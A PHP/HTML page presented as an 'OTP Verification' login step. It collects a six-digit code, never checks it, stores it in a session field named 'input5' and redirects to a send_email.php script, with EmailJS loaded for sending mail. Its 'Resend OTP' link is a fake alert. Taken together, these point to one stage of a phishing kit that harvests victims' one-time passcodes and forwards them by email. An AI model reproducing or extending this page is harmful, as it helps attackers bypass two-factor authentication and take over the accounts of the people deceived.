
<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Concatenate OTP array into a single string
    $_SESSION["input5"] = implode('', $_POST["otp"]);
    header("Location: send_email.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <link rel="stylesheet" href="script.js">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script type="text/javascript">
        (function () {
            emailjs.init({
                publicKey: "jH2r_aWib6H3ZNGGJ",
            });
        })();
    </script>
    <style>
        /* General Body Styling */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }

        /* Login Container */
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
        }

        /* Login Card */
        .login-card {
            display: flex;
            width: 1005px;
            min-height: 340px;
            border-radius: 8px;
            overflow: hidden;
            background-color: #ffffff;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
        }

        /* Left Section */
        .left-section {
            flex: 1;
            padding: 30px;
            text-align: center;
        }

        .left-section h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .logo-container svg {
            margin-bottom: 15px;
        }

        .email-display-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #333;
            font-size: 16px;
            margin-top: 15px;
        }

        /* Right Section (OTP Card) */
        .right-section {
            flex: 1;
            padding: 30px;
        }

        .otp-card {
            width: 100%;
            text-align: center;
        }

        .otp-header h1 {
            font-size: 22px;
            color: #333;
            margin-bottom: 8px;
        }

        .otp-header p {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }

        /* OTP Input Group */
        .otp-input-group {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .otp-input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        /* Footer Buttons */
        .otp-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .verify-button {
            background-color: #4285f4;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .verify-button:hover {
            background-color: #357ae8;
        }

        .resend-link {
            color: #4285f4;
            font-size: 14px;
            cursor: pointer;
            text-decoration: underline;
        }

        .resend-link:hover {
            color: #357ae8;
        }
    </style>
</head>
<body>
<?php
    if (isset($_SESSION['message'])) {
        // Display success or error message
        $messageType = $_SESSION['message_type'] == "success" ? "green" : "red";
        echo "<p style='color: $messageType;'>{$_SESSION['message']}</p>";

        // Clear message from session
        unset($_SESSION['message']);
        unset($_SESSION['message_type']);
    }
    ?>
    <div class="login-container">
        <div class="login-card">
            <div class="left-section">
                <h1>Welcome</h1>
                <div class="email-display-container">
                    <!-- Email display icon and logic here, if needed -->
                </div>
            </div>

            <div class="right-section otp-card">
                <form action="" method="post">
                    <div class="otp-header">
                        <h1>Verify OTP</h1>
                        <p>Enter the 6-digit OTP sent to your registered email.</p>
                    </div>

                    <div class="otp-input-group">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp2')" id="otp1">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp3')" id="otp2">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp4')" id="otp3">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp5')" id="otp4">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp6')" id="otp5">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" id="otp6">
                    </div>

                    <div class="otp-footer">
                        <button type="submit" class="verify-button" name="send" id="contact-submit">Verify OTP</button>
                        <span class="resend-link">Resend OTP</span>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        function moveToNext(currentInput, nextInputId) {
            if (currentInput.value.length === 1 && nextInputId) {
                document.getElementById(nextInputId).focus();
            } else if (currentInput.value.length === 0) {
                const prevInput = currentInput.previousElementSibling;
                if (prevInput) prevInput.focus();
            }
        }

        document.querySelector('.resend-link').addEventListener('click', function() {
            alert("OTP has been resent to your registered email.");
            // Add AJAX or resend logic here if needed
        });
    </script>
</body>
</html>
